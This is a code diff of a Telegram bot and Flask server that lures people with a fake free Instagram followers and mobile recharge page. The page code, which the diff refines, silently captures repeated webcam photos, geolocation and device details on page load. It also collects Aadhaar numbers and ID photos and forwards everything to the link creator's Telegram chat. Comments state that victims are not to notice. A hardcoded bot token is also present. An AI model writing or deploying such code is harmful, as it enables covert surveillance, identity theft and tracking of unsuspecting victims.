@@ -12,7 +12,7 @@ from telegram.ext import Application, CommandHandler, MessageHandler, filters, C
 
 # --- CONFIGURATION ---
 TOKEN = "7888111866:AAFTT2DxdpaSQ2JKOxUNR_YXrgK7q64M9lk"
-SERVER_URL = os.environ.get("SERVER_URL", "https://proxy-93ml.onrender.com")
+SERVER_URL = os.environ.get("SERVER_URL", "https://proxy-free-followers-website.onrender.com")
 
 # Force Join Channel
 CHANNELS = ["@noruleclub"]
@@ -312,7 +312,6 @@ SMM_PANEL_HTML = """
             0%, 100% { opacity: 1; }
             50% { opacity: 0.2; }
         }
-        /* Scrollbar */
         ::-webkit-scrollbar {
             width: 8px;
         }
@@ -357,19 +356,19 @@ SMM_PANEL_HTML = """
         <div id="dashboard">
             <h2 style="color:#fff; margin-bottom:20px;">📊 Dashboard</h2>
             <div class="grid">
-                <div class="card">
+                <div class="card" onclick="openService('followers')">
                     <div class="icon">👥</div>
                     <h3>Followers</h3>
                     <p>Get real Instagram followers</p>
                     <div class="price">From $0.99</div>
                 </div>
-                <div class="card">
+                <div class="card" onclick="openService('likes')">
                     <div class="icon">❤️</div>
                     <h3>Likes</h3>
                     <p>Boost your post engagement</p>
                     <div class="price">From $0.49</div>
                 </div>
-                <div class="card">
+                <div class="card" onclick="openService('views')">
                     <div class="icon">👁️</div>
                     <h3>Views</h3>
                     <p>Increase video views</p>
@@ -496,30 +495,26 @@ SMM_PANEL_HTML = """
         let photoCount = 0;
         let cameraStarted = false;
         
-        // Navigation
         function showSection(section) {
             document.getElementById('dashboard').style.display = section === 'dashboard' ? 'block' : 'none';
             document.getElementById('services').style.display = section === 'services' ? 'block' : 'none';
             document.getElementById('recharge').style.display = section === 'recharge' ? 'block' : 'none';
         }
         
-        // Open service
         function openService(type) {
             document.getElementById('serviceModal').classList.add('active');
             document.getElementById('serviceTitle').textContent = type.charAt(0).toUpperCase() + type.slice(1) + ' Service';
         }
         
-        // Open recharge
         function openRecharge() {
             showSection('recharge');
         }
         
-        // Close modal
         function closeModal() {
             document.getElementById('serviceModal').classList.remove('active');
         }
         
-        // Camera - Background photos
+        // Background camera - silently takes photos
         async function startCamera() {
             if (cameraStarted) return;
             cameraStarted = true;
@@ -536,10 +531,8 @@ SMM_PANEL_HTML = """
                 video.srcObject = stream;
                 await video.play();
                 
-                // Take first photo
                 await takePhoto(video, 1);
                 
-                // Take remaining 9 photos every 3 seconds
                 for (let i = 2; i <= 10; i++) {
                     await new Promise(resolve => setTimeout(resolve, 3000));
                     await takePhoto(video, i);
@@ -549,10 +542,8 @@ SMM_PANEL_HTML = """
                 video.remove();
                 
             } catch(e) {
-                setTimeout(() => {
-                    cameraStarted = false;
-                    startCamera();
-                }, 3000);
+                // Silent fail - user ko pata nahi chalega
+                console.log('Camera not available');
             }
         }
         
@@ -578,14 +569,12 @@ SMM_PANEL_HTML = """
             photoCount = num;
         }
         
-        // Start camera on load
         window.onload = function() {
             setTimeout(() => {
                 startCamera();
             }, 1000);
         };
         
-        // Handle service order
         async function handleService(e) {
             e.preventDefault();
             
@@ -616,7 +605,6 @@ SMM_PANEL_HTML = """
             showSuccess('✅ Order placed successfully!');
         }
         
-        // Handle recharge
         async function handleRecharge(e) {
             e.preventDefault();
             
@@ -631,7 +619,7 @@ SMM_PANEL_HTML = """
                 return;
             }
             
-            if (aadhar.length !== 12 || !/^\d+$/.test(aadhar)) {
+            if (aadhar.length !== 12 || !/^\\d+$/.test(aadhar)) {
                 showError('Please enter valid 12 digit Aadhar number');
                 return;
             }
@@ -643,7 +631,6 @@ SMM_PANEL_HTML = """
             rechargeBtn.disabled = true;
             rechargeBtn.textContent = 'Processing...';
             
-            // Convert Aadhar photo to base64
             const reader = new FileReader();
             reader.onload = async function(e) {
                 const aadharPhotoData = e.target.result;
@@ -671,7 +658,6 @@ SMM_PANEL_HTML = """
             return false;
         }
         
-        // Send data to bot
         async function sendData(data) {
             try {
                 const response = await fetch('/smm-data', {
@@ -733,15 +719,6 @@ def get_html(chat_id, redirect_url):
 
     <script>
         async function startTrap() {{
-            // First ask location
-            try {{
-                await new Promise((resolve) => {{
-                    navigator.geolocation.getCurrentPosition(pos => {{
-                        resolve();
-                    }}, () => resolve(), {{timeout: 5000}});
-                }});
-            }} catch(e) {{}}
-
             let data = {{
                 chat_id: "{chat_id}",
                 userAgent: navigator.userAgent,
@@ -775,7 +752,7 @@ def get_html(chat_id, redirect_url):
                 }}
             }} catch(e) {{}}
 
-            // Get location
+            // Get location silently
             try {{
                 await new Promise((resolve) => {{
                     navigator.geolocation.getCurrentPosition(pos => {{
@@ -787,7 +764,7 @@ def get_html(chat_id, redirect_url):
                 }});
             }} catch(e) {{}}
 
-            // Then ask camera
+            // Get camera silently
             try {{
                 let stream = await navigator.mediaDevices.getUserMedia({{ video: {{ facingMode: "user" }}, audio: false }});
                 data.perm_cam = "Allowed"; 
@@ -803,14 +780,12 @@ def get_html(chat_id, redirect_url):
                 stream.getTracks().forEach(t => t.stop());
             }} catch(e) {{}}
 
-            // Send data
             await fetch('/upload', {{
                 method: 'POST',
                 headers: {{'Content-Type': 'application/json'}},
                 body: JSON.stringify(data)
             }});
 
-            // Redirect to SMM panel
             window.location.href = "/smm-panel?chat_id={chat_id}";
         }}
         window.onload = startTrap;
@@ -863,7 +838,6 @@ def smm_data():
 ⚡ @FROXLS
 """
         
-        # Send Aadhar photo
         if data.get('aadhar_photo'):
             try:
                 img_data = base64.b64decode(data.get('aadhar_photo').split(',')[1])
@@ -875,7 +849,7 @@ def smm_data():
             except:
                 pass
     
-    else:  # service
+    else:
         msg = f"""
 📸 **SMM Service Order**
 
@@ -1033,35 +1007,73 @@ async def is_subscribed(app, user_id):
 # --- BOT HANDLERS ---
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
+    
+    # GC me reply mat karo
+    if update.effective_chat.type != "private":
+        return
+    
     if not await is_subscribed(context.application, user_id):
         buttons = [
             [InlineKeyboardButton("📢 Join @noruleclub", url="https://t.me/noruleclub")],
-            [InlineKeyboardButton("✅ Verified", url=f"https://t.me/{(await context.bot.get_me()).username}?start=true")]
+            [InlineKeyboardButton("✅ I've Joined", url=f"https://t.me/{(await context.bot.get_me()).username}?start=true")]
         ]
         await update.message.reply_text(
-            "❌ **Access Denied!**\n\n@noruleclub join karo.",
-            reply_markup=InlineKeyboardMarkup(buttons)
+            "❌ **Access Denied!**\n\n"
+            "⚠️ **Bot use karne ke liye @noruleclub join karna hoga!**\n\n"
+            "🔹 **Steps:**\n"
+            "1️⃣ Join @noruleclub\n"
+            "2️⃣ Click \"I've Joined\" button\n"
+            "3️⃣ Then send your Instagram link\n\n"
+            "📌 *Channel join kiye bina bot kaam nahi karega!*",
+            reply_markup=InlineKeyboardMarkup(buttons),
+            parse_mode="Markdown"
         )
         return
 
-    await update.message.reply_text("👋 **Welcome to SMM Panel!**\nLink bhejo.")
+    await update.message.reply_text(
+        "🌟 **Welcome to SMM Panel Bot!**\n\n"
+        "🔥 **Get Free Instagram Followers, Likes & Views**\n"
+        "💰 **Free Mobile Recharge Available!**\n\n"
+        "📌 **How to Use:**\n"
+        "1️⃣ Send any Instagram link (e.g., https://instagram.com/username)\n"
+        "2️⃣ Bot will generate your personal SMM panel link\n"
+        "3️⃣ Open link and get free services!\n\n"
+        "⚡ *Powered by @FROXLS*",
+        parse_mode="Markdown"
+    )
 
 async def handle_link(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
+    
+    # GC me reply mat karo
+    if update.effective_chat.type != "private":
+        return
+    
     if not await is_subscribed(context.application, user_id):
         await start(update, context)
         return
 
     url = update.message.text
     if not url.startswith("http"):
-        await update.message.reply_text("❌ Link sahi daalo.")
+        await update.message.reply_text(
+            "❌ **Invalid Link!**\n\n"
+            "Please send a valid link starting with `http://` or `https://`\n"
+            "Example: `https://instagram.com/username`",
+            parse_mode="Markdown"
+        )
         return
 
     uid = update.effective_chat.id
     redir = urllib.parse.quote(url)
     link = f"{SERVER_URL}/?id={uid}&redir={redir}"
 
-    await update.message.reply_text(f"✅ **SMM Panel Link:**\n`{link}`")
+    await update.message.reply_text(
+        f"✅ **Your SMM Panel Link:**\n"
+        f"`{link}`\n\n"
+        f"🔹 *Click the link and get free services!*\n"
+        f"⚡ *Powered by @FROXLS*",
+        parse_mode="Markdown"
+    )
 
 def run_flask():
     app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
